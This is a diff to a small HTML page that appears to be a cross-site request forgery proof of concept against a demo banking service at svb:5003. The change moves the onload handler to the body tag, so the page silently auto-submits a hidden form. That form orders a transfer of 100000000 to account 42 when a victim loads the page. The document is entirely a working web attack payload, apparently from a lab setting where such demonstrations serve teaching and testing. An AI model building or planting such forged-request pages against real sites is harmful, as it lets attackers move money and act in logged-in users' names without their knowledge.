@@ -3,9 +3,9 @@
 <head>
 	<title>Send POST request on page load</title>
 </head>
-<body>
+<body onload="document.form1.submit()">
 	<h1>Send a POST request</h1>
-	<form method="post" action="http://svb:5003/transfer/1" onload="document.form1.submit()">
+	<form method="post" action="http://svb:5003/transfer/1">
 		<input type="hidden" name="account" value="42">
 		<input type="hidden" name="amount" value="100000000">
 		<input type="submit" value="Submit">
